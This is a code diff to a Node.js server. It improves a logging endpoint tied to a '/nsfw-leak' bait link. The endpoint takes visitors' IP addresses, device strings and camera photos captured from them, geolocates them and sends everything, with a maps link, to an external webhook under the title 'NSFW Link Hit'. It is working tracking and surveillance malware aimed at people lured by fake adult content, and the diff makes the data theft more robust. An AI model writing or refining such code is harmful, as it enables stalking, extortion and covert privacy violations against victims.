@@ -192,58 +192,71 @@ app.get('/nsfw-leak/:id', (req, res) => {
   res.send(html);
 });
 
-// ================== LOG ENDPOINT ==================
+// ================== IMPROVED LOG ENDPOINT ==================
 app.post('/log', async (req, res) => {
-  const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
-  const originalUrl = trackingLinks.get(trackId) || 'Unknown';
-
-  let city = 'Unknown', region = '', country = '', lat = '', lon = '', isp = 'Unknown';
-
   try {
-    if (ip && ip !== 'Unknown') {
-      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { timeout: 6000 });
-      if (geo.data.status === "success") {
-        city = geo.data.city || 'Unknown';
-        region = geo.data.regionName || '';
-        country = geo.data.country || '';
-        lat = geo.data.lat || '';
-        lon = geo.data.lon || '';
-        isp = geo.data.isp || 'Unknown';
+    const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
+    const originalUrl = trackingLinks.get(trackId) || 'Unknown';
+
+    let city = 'Unknown', region = '', country = '', lat = '', lon = '', isp = 'Unknown';
+
+    // Better geo lookup
+    try {
+      if (ip && ip !== 'Unknown' && ip !== '::1') {
+        const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org`, { 
+          timeout: 7000 
+        });
+        if (geo.data.status === "success") {
+          city = geo.data.city || 'Unknown';
+          region = geo.data.regionName || '';
+          country = geo.data.country || '';
+          lat = geo.data.lat || '';
+          lon = geo.data.lon || '';
+          isp = geo.data.isp || geo.data.org || 'Unknown';
+        }
       }
+    } catch (e) {
+      console.error("Geo error:", e.message);
     }
-  } catch (e) {}
 
-  const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
-  const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '#';
+    const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
+    const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '#';
 
-  const embed = {
-    title: "🎯 NSFW Link Hit",
-    color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
-    fields: [
-      { name: "IP", value: `\`${ip}\``, inline: true },
-      { name: "Location", value: `${locationText} (${lat || 'N/A'}, ${lon || 'N/A'})`, inline: false },
-      { name: "Camera", value: cameraAccess, inline: true },
-      { name: "ISP", value: isp, inline: true },
-      { name: "Maps", value: mapsLink !== '#' ? `[📍 View on Maps](${mapsLink})` : "N/A", inline: false },
-      { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
-      { name: "Original URL", value: originalUrl, inline: false }
-    ],
-    timestamp: new Date().toISOString()
-  };
+    const embed = {
+      title: "🎯 NSFW Link Hit",
+      color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
+      description: `**Camera:** ${cameraAccess}`,
+      fields: [
+        { name: "IP", value: `\`${ip || 'Unknown'}\``, inline: true },
+        { name: "Location", value: `${locationText}\n${lat && lon ? `(${lat}, ${lon})` : ''}`, inline: false },
+        { name: "ISP", value: isp, inline: true },
+        { name: "Device", value: userAgent ? userAgent.substring(0, 100) : "Unknown", inline: false },
+        { name: "Maps", value: mapsLink !== '#' ? `[📍 Open in Google Maps](${mapsLink})` : "Not available", inline: false },
+        { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
+        { name: "Original URL", value: originalUrl, inline: false }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: `Track ID: ${trackId}` }
+    };
 
-  try {
     if (photo && photo.startsWith('data:image')) {
       const form = new FormData();
       form.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
       const base64Data = photo.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
-      form.append('file', buffer, 'photo.jpg');
-      await axios.post(WEBHOOK_URL, form, { headers: form.getHeaders() });
+      form.append('file', buffer, { filename: 'captured.jpg', contentType: 'image/jpeg' });
+
+      await axios.post(WEBHOOK_URL, form, { 
+        headers: form.getHeaders() 
+      });
     } else {
       await axios.post(WEBHOOK_URL, { embeds: [embed] });
     }
+
+    console.log(`✅ Log sent for ${trackId} | Camera: ${cameraAccess} | IP: ${ip}`);
   } catch (err) {
-    console.error("Webhook error:", err.message);
+    console.error("❌ Log endpoint error:", err.message);
   }
 
   res.sendStatus(200);
